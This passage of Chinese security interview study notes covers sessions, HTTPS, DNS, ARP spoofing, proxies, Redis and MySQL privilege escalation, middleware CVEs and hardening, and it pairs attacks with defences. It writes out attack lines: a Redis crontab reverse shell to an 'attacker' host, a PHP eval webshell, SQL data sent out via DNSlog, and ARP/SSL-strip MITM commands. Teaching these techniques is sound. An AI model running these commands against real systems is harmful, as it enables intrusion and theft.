- 存储位置：服务器端（文件、数据库、Redis 等），无大小限制
- 安全性：相对安全，但依赖 SessionID 的保密性
- 生命周期：会话结束或超时失效
- 实现：服务器创建 Session，生成 SessionID 返回客户端

**联系**：
- Session 依赖 Cookie 传递 SessionID（JSESSIONID/PHPSESSID）
- 禁用 Cookie 时可用 URL 重写（?JSESSIONID=xxx）或表单隐藏域
- 二者配合：Session 存敏感数据，Cookie 存非敏感标识

**安全要点**：
- Cookie 必须设置 http-only 防 XSS 窃取
- Session 必须设置 Secure 标志（仅 HTTPS 传输）
- SessionID 要足够随机，防止会话固定攻击
- 重要操作要重新生成 SessionID

**解析**：

考察意图：Web 会话管理基础，几乎所有 Web 安全场景的入口。回答要点：要讲清存储位置差异、安全边界、攻击面（XSS/会话固定/CSRF）。易错点：误以为 Session 绝对安全（实际 SessionID 泄露等同被入侵）。面试官想听到：能列出 http-only / Secure / SameSite 等 Cookie 安全属性，理解会话固定攻击和会话劫持。

**考察知识点**：

- Cookie 客户端存储 vs Session 服务端存储
- SessionID 通过 Cookie 传递
- http-only / Secure / SameSite 属性
- 会话固定攻击与会话劫持

---


---

### 第 45 天（精讲） ★★★★★ HTTPS 握手过程及与 HTTP 的区别


**主题**：网络安全基础 / HTTP 协议

**答案**：

HTTPS = HTTP + TLS/SSL，默认端口 443（HTTP 默认 80）。TLS 1.2 握手过程：
1. ClientHello：客户端发送支持的 TLS 版本、加密套件列表、随机数。
2. ServerHello + Certificate：服务端确认版本套件，发送数字证书（含服务端公钥）和随机数。
3. 客户端验证证书链（CA 签名→服务端域名），用证书公钥加密 Pre-master secret 发送。
4. 双方基于 Client Random + Server Random + Pre-Master 推导出对称会话密钥。
5. ChangeCipherSpec + Finished：双方切换到对称加密通信，验证握手完整性。

核心区别：
- HTTPS 需要 CA 证书，HTTP 不需要
- HTTPS 默认 443 端口，HTTP 默认 80
- HTTPS 数据传输使用对称加密（AES）+ 摘要（SHA256）防窃听、防篡改
- HTTPS 有 TLS 握手开销，比 HTTP 慢约 100ms
- HTTPS 可防止中间人攻击，HTTP 明文传输易被嗅探

涉及技术：非对称加密（RSA/ECDHE 用于密钥交换）+ 对称加密（AES 加密数据）+ 摘要（SHA256 防篡改）+ 数字证书（CA 身份认证）+ HMAC（完整性校验）。

**解析**：

考察意图：现代 Web 安全基础。回答要点：要展开 TLS 握手步骤而非笼统说"加密传输"。易错点：把 SSL 和 TLS 混淆，或误以为 HTTPS=100% 安全（实际上存在证书验证绕过、HSTS 缺失、SSL Stripping 等攻击）。面试官想听到：能讲清非对称和对称加密分工（RSA 传密钥 + AES 加密数据）、TLS 1.3 改进（1-RTT 握手、强制 ECDHE 前向保密）。

**考察知识点**：

- TLS 1.2 vs 1.3 握手差异
- 非对称加密传对称密钥的混合方案
- CA 证书链验证机制
- 前向保密 PFS / ECDHE

---


---

### 第 46 天（精讲） DNS 原理、解析过程与安全攻击
**主题**：网络协议 / DNS / 应用层

**答案**：

DNS（Domain Name System）是互联网的"电话簿"，将域名（example.com）映射为 IP 地址（93.184.216.34）。

**1. DNS 作用**：
- 域名 → IP 的分布式数据库（应用层协议）。
- 默认走 **UDP 53**（响应 >512 字节或 zone transfer 用 TCP 53）。
- 是所有 Web 服务的入口，**性能**和**安全**都至关重要。

**2. 域名结构**（从右到左）：

```
.                       （根，13 组根 DNS）
├── .com                （顶级域 TLD，gTLD 通用顶级域）
│   ├── example.com     （一级域）
│   │   ├── www.example.com   （子域）
│   │   ├── mail.example.com
│   │   └── cdn.example.com
└── .cn                 （国家顶级域 ccTLD）
    ├── baidu.cn
    └── gov.cn
```

**3. 记录类型**：

| 类型 | 用途 | 示例 |
|------|------|------|
| **A** | 域名 → IPv4 | `example.com → 93.184.216.34` |
| **AAAA** | 域名 → IPv6 | `example.com → 2606:2800:220:1::1` |
| **CNAME** | 别名 → 规范名 | `www.example.com → example.com` |
| **MX** | 邮件服务器 | `mail.example.com`（带优先级 10） |
| **NS** | 权威 DNS 服务器 | `ns1.example.com` |
| **TXT** | 任意文本（SPF/DKIM/域名验证） | `v=spf1 include:_spf.google.com ~all` |
| **PTR** | IP → 域名（反向解析） | `34.216.184.93.in-addr.arpa → example.com` |
| **SOA** | 起始授权（zone 起点） | 含主 DNS、管理员邮箱、TTL |
| **SRV** | 服务定位 | `_sip._tcp.example.com` |
| **CAA** | 限制可签发证书的 CA | `0 issue "letsencrypt.org"` |
| **DS** | DNSSEC 委托签名者记录 | 含子区域签名哈希 |

**4. 解析过程**（以 `www.example.com` 为例）：

```
1. 浏览器缓存（Chrome 默认 60s）
   命中 → 返回 IP
2. 系统缓存（Windows ipconfig /displaydns，Linux systemd-resolved）
   命中 → 返回 IP
3. hosts 文件
   - Windows: C:\Windows\System32\drivers\etc\hosts
   - Linux: /etc/hosts
   命中 → 返回 IP
4. 本地 DNS（递归解析器，运营商或 8.8.8.8）
   未命中 → 继续向下递归
5. 根 DNS（a.root-servers.net ~ m.root-servers.net，全球 13 组）
   返回 .com 顶级域 NS
6. 顶级域 DNS（.com）
   返回 example.com 权威 NS
7. 权威 DNS（example.com 注册商或自建）
   返回 www.example.com 的 A 记录 IP
8. 本地 DNS 缓存并返回客户端
```

**递归 vs 迭代查询**：
- **递归查询**：客户端 → 本地 DNS（代查到底再返回）。
- **迭代查询**：本地 DNS → 各级 DNS（根 → TLD → 权威），各级返回"下一级问谁"。

**5. DNS 安全攻击**：

**DNS 劫持**：
- 篡改本地 DNS 服务器或路由器 DNS 设置，返回恶意 IP。
- 用户访问合法域名 → 被重定向到钓鱼网站。
- 防御：HTTPS 校验证书、DNSSEC、路由器安全。

**DNS 污染 / 投毒**：
- 在中间网络（GFW/中间设备）注入伪造 DNS 响应。
- 比真实响应抢先到达 → 用户拿到错误 IP。
- 防御：DoH（DNS over HTTPS）/ DoT（DNS over TLS）。

**DNS 欺骗 / 抢答**：
- 攻击者在权威 DNS 之前，抢先返回伪造响应。
- 利用：**DNS 抢答 ID 预测**（Transaction ID 仅 16 bit，可爆破）。
- 防御：源端口随机化、随机化 Transaction ID、DNSSEC。

**DNS 隧道（隐蔽通道）**：
- 把数据编码在域名中（`data.attacker.com`），通过权威 DNS 中转。
- 工具：`iodine`、`dnscat2`、`dns2tcp`。
- 用于：**绕过防火墙** + **C2 隐蔽通信** + **数据外带**（同 dnslog 外带原理）。
- 检测：长域名、高熵值 TXT 请求、TXT 频率异常、罕见 TLD（.xyz/.top）。

**域传送漏洞（Zone Transfer）**：
- `dig @ns1.example.com example.com AXFR`
- 若允许 → 获取**全量子域**（内部机器、备用 IP）。
- 防御：限制 zone transfer 来源 IP、TSIG 鉴权。

**6. 关键工具**：
| 工具 | 用途 |
|------|------|
| `dig` | DNS 查询（最常用） |
| `nslookup` | Windows 默认 |
| `host` | Linux 默认 |
| `dnsenum` | 子域枚举 + 区域传送 |
| `dnsrecon` | 完整枚举 + brute force |
| `subfinder` | 被动子域收集 |
| `massdns` | 高性能 DNS brute force |
| `dnsx` | 批量解析 + 过滤 |

**7. DNSlog 平台**：
- `dnslog.cn` / `ceye.io` / `Burp Collaborator` / `interactsh`
- 用于 SQL 盲注外带、SSRF 验证、XSS 接收 cookie、XXE 外带。

**解析**：

考察意图：网络协议基础必备，常结合 SSRF（SSRF 验证常常是 "dnslog 接收数据"）。易错点：把"递归查询"和"迭代查询"混用（DNS 是"递归+迭代混合"），忽略 DNS 默认 UDP 但 zone transfer 走 TCP。面试官想听到：完整的解析链路（浏览器→系统→hosts→本地 DNS→根→TLD→权威）、DNS 攻击分类（劫持/污染/隧道）、DNSlog 用途。

**考察知识点**：
- DNS 默认 UDP 53 + 大响应或 zone transfer 走 TCP 53
- 完整解析链路与各级缓存
- 常见记录类型（A/MX/CNAME/PTR/NS/TXT）
- DNS 攻击：劫持 / 污染 / 隧道 / 域传送
- DNSlog 在注入/SSRF/XXE 中的应用
- 与 SSRF、CDN、HTTPS 校验的关联

**验证脚本**（DNS 信息收集与攻击验证）：
```bash
# 1. 基本解析
dig +short www.example.com
dig +short AAAA www.example.com
dig +short MX example.com
dig +short TXT example.com
dig +short NS example.com

# 2. 区域传送漏洞
dig @ns1.example.com example.com AXFR
# 工具批量
dnsenum example.com
dnsrecon -d example.com

# 3. DNSlog 接收 SQL 盲注（无回显 SQLi 验证）
# 在 ceye.io 申请 domain: xxxxx.ceye.io
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT hex(database())), '.xxxxx.ceye.cn\\a'));

# 4. SSRF 验证（DNS 触发）
curl "http://target.com/proxy?url=http://xxxxx.ceye.cn"
# 观察 ceye 后台是否有 xxx.target-host.ceye.cn 请求

# 5. DNS 隧道检测（Snort 规则片段）
alert udp any any -> any 53 (msg:"DNS Tunnel Long Query"; \
  dsize:>60; content:"A"; nocase; sid:1000001; rev:1;)

# 6. 子域爆破
subfinder -d example.com -o sub.txt
massdns -r resolvers.txt sub.txt -o S -w results.txt
```

### 第 47 天（精讲） ARP 欺骗原理与防御
**主题**：网络协议 / ARP / 局域网攻击

**答案**：

ARP（Address Resolution Protocol）负责**IP → MAC** 的映射，ARP 欺骗（ARP Spoofing / ARP Poisoning）是**局域网中间人攻击**的核心。

**1. ARP 工作原理**：
```
主机 A 想知道 192.168.1.1（网关）的 MAC
1. A 广播 ARP 请求："谁是 192.168.1.1？请告诉 192.168.1.100"
2. 网关单播 ARP 应答："192.168.1.1 的 MAC 是 aa:bb:cc:dd:ee:ff"
3. A 缓存到 ARP 表（老化时间约 15-20 分钟）
```

**2. ARP 漏洞根源**：
- **无认证**：ARP 协议设计时局域网是可信环境，无身份验证。
- **无状态**：主机收到 ARP 应答就更新缓存，无需先发请求（**主动更新**）。
- **广播信任**：所有 ARP 报文都接受。

**3. ARP 欺骗攻击流程**：

```
正常：A --(网关 MAC:aa:bb)--> 网关 --> Internet
攻击：B 持续向 A 发 ARP 应答："网关 IP 192.168.1.1 的 MAC 是 cc:dd:ee:ff:11:22"
      A 缓存更新为：错误 MAC
之后：A 流量 → cc:dd:ee:ff:11:22（其实是攻击者 B 的 MAC）→ B 转发到真网关 → Internet
```

**双向欺骗**（必须）：
- 欺骗 A："我是网关"（拦截 A 出去）
- 欺骗网关："我是 A"（拦截网关回来）
- 否则被攻击者会断网被发现。

**4. 攻击效果**：
| 攻击类型 | 效果 |
|----------|------|
| 中间人（MITM） | 嗅探 HTTP/HTTPS 流量 |
| 会话劫持 | 窃取 Cookie / Session |
| 断网攻击 | 替换 MAC 为不存在地址 |
| DNS 欺骗叠加 | MITM + 修改 DNS 应答 |

**5. 实战工具**：
- `ettercap`：经典 MITM 工具，图形化 + 命令行
- `arpspoof`（dsniff 套件）：单向欺骗
- `bettercap`：现代 MITM 框架
- `Cain & Abel`：Windows 老牌综合嗅探
- `arptables`：Linux ARP 防火墙

**ettercap 实战**：
```bash
# 启动 ARP 欺骗 + 嗅探（命令行模式）
ettercap -T -q -M arp:remote /192.168.1.100// /192.168.1.1//

# 图形化模式（适合演示）
ettercap -G
# Hosts → Scan for hosts → Hosts list
# Mitm → ARP poisoning → Sniff remote connections
```

**6. 防御措施**：

| 层级 | 防御手段 |
|------|----------|
| 主机层 | **静态 ARP 绑定**（`arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff`）|
| 主机层 | **ARP 防火墙**（360、AntiARP） |
| 交换层 | **DHCP Snooping** + **Dynamic ARP Inspection (DAI)** |
| 交换层 | **端口安全**（限制 MAC 学习数量） |
| 网络层 | **VLAN 隔离** + **IP Source Guard** |
| 协议层 | **ARP 代理** + **802.1X 认证** |

**企业级方案**：华为/Cisco 交换机启用 DAI，对 DHCP 分配表外的 ARP 包直接丢弃。

**7. 检测方法**：
- `arp -a` 反复查看是否有重复 MAC/IP 对应。
- Wireshark 抓包看 ARP 包频率（同一 IP 频繁声明 MAC）。
- IDS 规则：同一 IP 在短时间内 MAC 变化告警。

**解析**：

考察意图：内网渗透 / MITM 基础。易错点：把 ARP 欺骗和 DNS 欺骗混为一谈；忘记双向欺骗导致断网；误以为 HTTPS 就防 MITM（**HTTPS 配合 SSL Strip 仍可降级**）。面试官想听到：完整 MITM 流程、ARP 协议设计缺陷、企业级防御（DAI + DHCP Snooping）。

**考察知识点**：
- ARP 协议无认证设计缺陷
- ARP 欺骗双向攻击原理
- MITM 与 HTTPS 降级（SSL Strip）
- ettercap/bettercap 工具链
- 企业防御：DHCP Snooping + DAI + 端口安全
- 与内网渗透横向移动结合

**验证脚本**（ARP 欺骗实验）：
```bash
# 实验环境：Kali Linux + 同局域网靶机

# 1. 启用 IP 转发（必须，否则目标断网）
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. 双向欺骗（终端 1 欺骗靶机，终端 2 欺骗网关）
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# 3. 嗅探 HTTP 流量
urlsnarf -i eth0
# 或 wireshark：filter "http"

# 4. HTTPS 降级（SSL Strip）
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
sslstrip -l 8080 -a -w /tmp/sslstrip.log

# 5.ettercap 一体化
ettercap -T -q -M arp:remote,forward /192.168.1.100// /192.168.1.1//

# 6. 检测 ARP 欺骗
arp -a  # Windows 查看，对比是否网关 IP 对应多个 MAC
```

### 第 48 天（精讲） 正向代理、反向代理、透明代理与 NAT
**主题**：网络协议 / 代理 / NAT

**答案**：

**1. 正向代理（Forward Proxy）**：代理**客户端**，客户端主动配置代理。
```
Client → 正向代理 → Internet → Web Server
```
- **位置**：客户端一侧。
- **典型用途**：
  - **科学上网**：绕过地域限制（Shadowsocks、V2Ray、Clash）。
  - **内网访问**：公司员工通过代理访问外网。
  - **缓存加速**：Squid 代理缓存减少外网流量。
  - **内容过滤**：企业代理拦截员工访问。
- **协议**：HTTP 代理（CONNECT 方法）、SOCKS4/5 代理。
- **客户端能感知**代理存在。

**2. 反向代理（Reverse Proxy）**：代理**服务端**，客户端无感知。
```
Client → Internet → 反向代理 → 后端 Server
```
- **位置**：服务端一侧。
- **典型用途**：
  - **负载均衡**：Nginx upstream 分发到多台后端。
  - **隐藏真实 IP**：CDN、Cloudflare 隐藏源站。
  - **HTTPS 卸载**：代理统一处理 SSL，后端走 HTTP。
  - **WAF**：ModSecurity、OpenResty 在反向代理层过滤恶意请求。
  - **缓存静态资源**：Varnish、Squid 反向。
- **协议**：HTTP/HTTPS、WebSocket、TCP/UDP（云厂商 LB）。
- **客户端**对代理无感知（以为是真服务器）。

**3. 透明代理（Transparent Proxy）**：客户端**无需配置**就被劫持到代理。
- 内网场景：网关路由器强制将 80/443 流量重定向到代理（**iptables REDIRECT**）。
- 用户无需在浏览器配置。
- 典型用途：酒店/校园网强制门户认证（Captive Portal）。

**4. NAT（Network Address Translation）**：在**网络层**做 IP+Port 转换。
- 解决 IPv4 地址枯竭。
- 家庭/公司内网多设备共享公网 IP。
- 类型：
  - **静态 NAT**：1 对 1 映射（如 DMZ 服务器）。
  - **动态 NAT**：地址池轮换。
  - **PAT（Port Address Translation / NAPT）**：最常用，多内网 IP 共享 1 公网 IP，靠端口号区分。
- **Linux 实现**：iptables/nftables MASQUERADE 规则。

**5. 正向 vs 反向代理对比**：

| 维度 | 正向代理 | 反向代理 |
|------|---------|----------|
| 代理对象 | 客户端 | 服务端 |
| 配置位置 | 客户端浏览器/系统 | 服务端机房 |
| 用户感知 | 主动配置 | 无感知 |
| 用途 | 翻墙、内网访问外网 | 负载均衡、CDN、WAF |
| 典型工具 | Squid、Privoxy、Shadowsocks | Nginx、HAProxy、F5 |

**6. 代理与渗透的关系**：

- **攻击者视角**：用代理隐藏真实 IP（Tor、ProxyChains）。
  ```bash
  proxychains4 curl http://target.com  # 走 SOCKS 代理
  ```
- **红队隐蔽**：C2 流量走 CDN 反代（如 Cloudflare Workers、Heroku）。
- **绕过地域限制**：SSRF 走代理到内网。
- **防御者视角**：WAF 在反向代理层（OpenResty + Lua）做拦截。
- **日志溯源**：代理日志 + X-Forwarded-For 头部可能伪造。

**7. X-Forwarded-For（XFF）头**：
- 反向代理添加，记录原始客户端 IP。
- **可被伪造**：客户端可手动添加 `X-Forwarded-For: 1.2.3.4`。
- 正确做法：使用 **`X-Real-IP`**（单一信任代理）或 **`X-Forwarded-For` 链路解析**（配合可信代理列表）。

**8. 实战场景**：
- **Nginx 反向代理 + HTTPS**：
  ```nginx
  server {
    listen 443 ssl;
    server_name example.com;
    ssl_certificate /etc/nginx/ssl/example.crt;
    location / {
      proxy_pass http://127.0.0.1:8080;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
  }
  ```
- **Frp 内网穿透**（公网 VPS → 内网 Web）：
  ```
  frps.ini（VPS）: bind_port = 7000
  frpc.ini（内网）: server_addr = x.x.x.x; [web]; type=http; local_port=80
  ```

**解析**：

考察意图：网络基础 + 代理与渗透结合。易错点：把正向/反向代理搞反（口诀"正向替客户，反向替服务"）；忽视 XFF 可伪造。面试官想听到：能区分四类代理、与渗透测试关联、XFF 风险、NAT 工作原理。

**考察知识点**：
- 正向代理 vs 反向代理的代理对象与用途
- 透明代理与强制门户
- NAT / PAT 工作机制
- X-Forwarded-For 伪造与信任代理
- Nginx 反代配置
- Frp/ NPS 内网穿透工具
- CDN/WAF 反代场景

**验证脚本**（代理配置实验）：
```bash
# 1. Squid 正向代理（服务端）
apt install squid -y
echo "http_port 3128" >> /etc/squid/squid.conf
service squid start

# 2. 客户端测试（curl 指定代理）
curl -x http://192.168.1.10:3128 http://example.com

# 3. Nginx 反向代理（最简）
server {
  listen 80;
  server_name test.local;
  location / {
    proxy_pass http://127.0.0.1:8080;
    proxy_set_header X-Real-IP $remote_addr;
  }
}

# 4. SSH 端口转发（正向）
ssh -L 8080:target.com:80 user@proxy.com  # 本地 8080 → 走代理 → 目标 80

# 5. SSH 端口转发（反向）
ssh -R 9000:127.0.0.1:80 user@vps.com  # VPS 9000 → 内网 80

# 6. frp 内网穿透（最常用）
# VPS:
frps -c frps.ini
# 内网:
frpc -c frpc.ini

# 7. proxychains 隐藏 IP
proxychains4 -q nmap -sT -Pn 10.10.10.1

# 8. 查看 XFF 是否被伪造
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
# 服务端日志记录：1.2.3.4（伪造）
```

### 第 49 天（精讲） ★★★★★ Redis 未授权访问与 getshell


**主题**：数据库安全 / Redis

**答案**：

Redis 未授权访问是经典的服务暴露漏洞：

**漏洞背景**：
- Redis 默认 6379 端口，未设密码（requirepass 为空）
- 早期版本（< 4.x）默认无认证
- 云上大量暴露 Redis 到公网

**危害利用**：

**1. 信息泄露**：
- `keys *` 枚举所有键
- `config get *` 读取配置（含 dir / dbfilename）
- `info` 查看 Redis 信息

**2. 写 SSH 公钥（Linux 主机）**：
- 前提：Redis 以 root 运行
```
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "ssh-rsa AAAA..."
save
```
- 通过 SSH 私钥登录

**3. 写 crontab 定时任务反弹 shell**：
```
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n"
save
```
- 每分钟反弹一次

**4. 写 WebShell（Windows + PHP 环境）**：
```
config set dir C:/phpstudy/WWW/
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save
```

**5. Redis 4.x/5.x+ 主从复制 RCE**：
- 利用主从复制同步 .so 模块加载执行
- 工具：redis-rogue-server / redis-rce
- 流程：
  1. 攻击者作为 master
  2. 目标 slave 连接并同步恶意 .so
  3. `module load` 加载执行

**6. SSRF + Redis 组合**：
- SSRF 探测内网 Redis
- gopher 协议发送 Redis 命令

**防御**：
1. 设置强密码 requirepass
2. `bind 127.0.0.1` 禁止外网访问
3. 关闭 `protected-mode no` 或升级开启
4. 防火墙限制 6379 端口
5. 不要以 root 运行 Redis
6. 禁用高危命令（`rename-command CONFIG ""`）
7. 升级到 Redis 6.x+

**解析**：

考察意图：未授权访问高频考点。回答要点：要讲清多种 getshell 方法+防御组合。易错点：只提 SSH 公钥方法。面试官想听到：能详细说明主从复制 RCE 的原理（Redis 4.x+ 新攻击面）、crontab 反弹 shell 的路径（`/var/spool/cron/$username`）、SSRF+Redis 组合利用（gopher 协议是关键）。

**考察知识点**：

- `config set dir + dbfilename` 写文件
- SSH 公钥 / crontab / WebShell 三种 getshell
- Redis 4.x+ 主从复制 RCE
- requirepass + bind 防御

---


---

### 第 50 天（精讲） ★★★★ MySQL UDF/MOF 提权原理


**主题**：操作系统与提权 / 数据库提权

**答案**：

MySQL 提权利用数据库的高权限执行系统命令：

**MySQL UDF 提权（User Defined Function）**：
- 原理：MySQL 允许用户自定义函数，通过上传 C/C++ 编写的 .dll/.so 扩展，可调用系统命令
- 步骤：
  1. 上传 lib_mysqludf_sys 到 plugin 目录
     - MySQL 5.1+：`@@plugin_dir`
     - MySQL < 5.1：上传到 `C:\Windows\System32`（默认搜索路径）
  2. 注册函数：
     ```sql
     CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll'
     ```
  3. 调用执行：`SELECT sys_eval('whoami')`
- sys_eval：执行命令并返回结果
- sys_exec：执行命令返回 exit code
- 必要条件：
  - FILE 权限（LOAD DATA 或 SELECT INTO OUTFILE）
  - plugin_dir 可写
  - secure_file_priv 为空
- MySQL 8.0+：库文件改名 `lib_mysqludf_sys_64.so` 等

**MySQL MOF 提权**：
- 原理：Mof 文件（Managed Object Format）每分钟被 WMI 服务加载，可执行 VBScript
- 利用：
  1. 上传 nullevt.mof 到 `C:\Windows\System32\wbem\mof\` 目录
  2. WMI 服务每分钟加载执行
  3. mof 文件中嵌入 VBScript 反弹 shell
- 必要条件：
  - FILE 权限
  - 系统权限（SYSTEM 运行 WMI 服务）
  - MySQL < 6.0 版本
- 限制：仅 Windows 系统，影响小

**防御**：
1. 数据库账号最小权限，禁止 FILE/Process/Super 权限
2. secure_file_priv 限制为 NULL 或指定目录
3. 限制 plugin_dir 目录权限
4. MySQL 升级到 5.7+/8.0
5. 数据库账号独立，与应用分离
6. 数据库服务器不应直接暴露公网

**解析**：

考察意图：数据库提权经典手法，几乎必问。回答要点：要讲清利用链和必要条件。易错点：忽视 secure_file_priv 限制（MySQL 5.7+ 默认开启）。面试官想听到：能详细说明 sys_eval 函数注册过程（SONAME 参数）、MOF 每分钟加载的特性（区别于 UDF 的一次性利用）、MySQL 8.0+ 路径变化（plugin_dir 定位）。

**考察知识点**：

- UDF lib_mysqludf_sys 扩展
- sys_eval 注册执行命令
- MOF 每分钟 WMI 加载
- secure_file_priv 限制

---


---

### 第 51 天（精讲） ★★★★★ 中间件漏洞（Tomcat/JBoss/WebLogic）


**主题**：Web 安全 / 中间件

**答案**：

**Tomcat 漏洞**：
1. 弱口令：admin/admin、tomcat/tomcat 登录后台部署 war 包
2. CVE-2017-12615 PUT 上传：开启 PUT 方法可上传 shell.jsp 到根目录
3. CVE-2020-1938 AJP Ghostcat：AJP 协议 8009 端口可读取 webapp 下任意文件（含 web.xml 敏感配置）
4. War 包部署：通过 `/manager/html` 部署 war 获取 shell

**JBoss 漏洞**：
1. JBoss 4.x/5.x 反序列化漏洞（CVE-2017-7504 / CVE-2017-12149）
2. 未授权访问控制台 `/jmx-console`、`/web-console`
3. War 包部署：`/admin-console` 部署 war
4. JMXInvokerServlet / JBoss MQ JMS 反序列化

**WebLogic 漏洞**：
1. T3 协议反序列化（CVE-2023-21839）：无需认证远程命令执行
2. CVE-2020-14882：管理控制台未授权 RCE（`/console/css/%25%32%25%2e%2e/admin` 登录绕过）
3. CVE-2018-2893：任意文件上传（`/ws_utc/begin.do`）
4. SSRF 漏洞：`uddiexplorer/SearchPublicRegistries.jsp`
5. XMLDecoder 反序列化
6. War 包部署：通过 console 部署 war

**通用检测方法**：
- 端口扫描：8080 / 8443 / 7001 / 1099 / 8009
- 弱口令爆破
- Shodan / FOFA 搜索特定标题
- POC 脚本验证（WebLogicTool、ysoserial）

**防御**：
1. 关闭不必要的 Web 控制台
2. 修改默认口令 + 复杂口令策略
3. 升级到最新版本
4. WAF 部署拦截反序列化 payload
5. 网络 ACL 限制管理端口

**解析**：

考察意图：护网面试高频，几乎必问。回答要点：要分中间件列 CVE。易错点：把不同中间件的漏洞混淆。面试官想听到：能讲清楚 T3 协议（WebLogic 专有）、AJP 协议（Tomcat 专有 8009）、反序列化 payload 特征（`ac ed 00 05` 开头）。

**考察知识点**：

- Tomcat PUT / AJP Ghostcat
- JBoss 反序列化 / 未授权
- WebLogic T3 / CVE-2020-14882
- 弱口令 + war 部署 + 反序列化三大攻击面

---


---

### 第 52 天（精讲） ★★★★ Windows/Linux 服务器安全基线加固


**主题**：主机安全与基线 / 基线加固

**答案**：

基线加固（Hardening）是按安全标准配置操作系统：

**Windows 基线加固**：

**1. 账号安全**：
- 强密码策略：8 位以上 + 复杂度（数字 + 大小写 + 特殊字符）
- 密码定期更换：90 天
- 锁定策略：5 次失败锁定 30 分钟
- 禁用 Guest 账号
- 重命名 Administrator 为非默认名
- 不显示上次登录用户名

**2. 关闭高危服务/端口**：
- Telnet（23）：明文传输
- SNMP（161/162）：弱口令/信息泄露
- SMB v1（445）：MS17-010
- Print Spooler：PrintNightmare
- Remote Registry：远程注册表
- NetBIOS：废弃协议

**3. 补丁更新**：
- WSUS / SCCM 集中管理
- 自动更新启用
- 关键补丁优先（CVE 高危）

**4. 防火墙规则**：
- 默认拒绝，仅开放必要端口
- 出站流量限制
- 阻止外网 Ping

**5. 日志与审计**：
- 启用安全日志 + 系统日志 + 应用日志
- 配置日志大小 + 覆盖策略
- 集中存储（WEF / EventLog Forwarding）
- Sysmon 增强监控

**6. 注册表加固**：
- 关闭 AutoRun（HKLM/.../Autorun）
- UAC 最高级别
- LSA Protection（PPL）防 mimikatz
- 限制空会话访问
- 禁用 LM Hash 存储

**7. 启用 BitLocker 磁盘加密**

**Linux 基线加固**：

**1. 账号安全**：
- `/etc/login.defs`：密码策略
- `/etc/pam.d/system-auth`：PAM 复杂度
- 禁用 root 远程登录（`PermitRootLogin no`）
- 禁用空密码账号
- 限制 su 权限（wheel 组）

**2. SSH 加固**：
- 修改默认端口（22 → 2222）
- 禁用密码登录（`PubkeyAuthentication yes`）
- 禁用 root 登录
- 限制登录尝试（`MaxAuthTries 3`）
- 协议版本 2

**3. 防火墙**：
- iptables / firewalld 规则
- 仅开放必要端口
- 入站默认拒绝

**4. 关闭不必要服务**：
```bash
chkconfig --list | grep :on
service service_name stop
chkconfig service_name off
```

**5. 文件权限**：
- `/etc/passwd` 644
- `/etc/shadow` 000
- `/etc/group` 644
- umask 027（限制默认权限）

**6. 日志审计**：
- rsyslog 集中日志
- auditd 审计框架
- 关键文件监控（`/etc/passwd` 等）

**7. 内核参数（sysctl）**：
- `net.ipv4.tcp_syncookies = 1`（防 SYN Flood）
- `net.ipv4.conf.all.rp_filter = 1`（防 IP 欺骗）
- `net.ipv4.conf.all.accept_redirects = 0`

**8. 文件完整性**：
- AIDE / Tripwire 监控关键文件
- 配置变更告警

**9. 最小安装原则**：
- 不安装多余组件
- 包最小化

**合规参考**：
- CIS Benchmark（行业标准）
- 等保 2.0 要求
- DISA STIG（美国国防部）

**解析**：

考察意图：运维安全核心问题。回答要点：要分账号/服务/防火墙/日志多个维度。易错点：只提防火墙忽视其他。面试官想听到：能详细说明 LSA Protection 防 mimikatz 的注册表键（RunLSA=1）、Linux PAM 密码复杂度配置、SSH 加固的具体配置项、CIS Benchmark 的标准编号（如 CIS_CentOS_Linux_8_Benchmark_v1.0.1）。

**考察知识点**：

- Windows LSA PPL 防 mimikatz
- Linux PAM 密码策略
- SSH 加固配置项
- CIS Benchmark 合规标准

---


---

### 第 53 天（精讲） 常见端口对应服务速查与利用
**主题**：网络协议 / 端口 / 信息收集

**答案**：

**1. 常用端口速查表**（渗透测试必备）：

| 端口 | 协议 | 服务 | 常见攻击面 |
|------|------|------|------------|
| 21 | TCP | FTP | 匿名登录、弱口令、ProFTPD mod_copy |
| 22 | TCP | SSH | 弱口令爆破、CVE-2024-6387 (regreSSHion) |
| 23 | TCP | Telnet | 明文传输、嗅探 |
| 25 | TCP | SMTP | 邮件伪造、Open Relay 中继 |
| 53 | UDP/TCP | DNS | DNS 域传送、dnslog、隧道 |
| 69 | UDP | TFTP | 匿名下载（无认证） |
| 80 | TCP | HTTP | Web 漏洞、SQLi/XSS |
| 110 | TCP | POP3 | 邮件明文 |
| 111 | TCP/UDP | RPCbind | 信息泄露 |
| 135 | TCP | RPC | Windows RPC 攻击 |
| 139 | TCP | NetBIOS | 永恒之蓝前置、信息泄露 |
| 143 | TCP | IMAP | 邮件 |
| 161 | UDP | SNMP | 默认 community string（public/private）|
| 389 | TCP | LDAP | 匿名绑定、信息枚举 |
| 443 | TCP | HTTPS | SSL 漏洞、Heartbleed |
| 445 | TCP | SMB | **永恒之蓝（MS17-010）** |
| 465/587 | TCP | SMTPS | 邮件 |
| 512-514 | TCP | rexec/rlogin/rsh | 明文认证 |
| 873 | TCP | rsync | 未授权、任意文件同步 |
| 993 | TCP | IMAPS | 邮件 |
| 995 | TCP | POP3S | 邮件 |
| 1080 | TCP | SOCKS | 代理跳板 |
| 1099 | TCP | Java RMI | 反序列化 |
| 1433 | TCP | MSSQL | 弱口令、xp_cmdshell |
| 1521 | TCP | Oracle | TNS 漏洞、弱口令 |
| 2049 | TCP | NFS | no_root_squash 提权 |
| 2181 | TCP | ZooKeeper | 未授权 stat |
| 2375/2376 | TCP | Docker API | 未授权容器接管 |
| 3000 | TCP | Grafana | CVE-2021-43798 任意文件读取 |
| 3306 | TCP | MySQL | 弱口令、UDF 提权、读文件 |
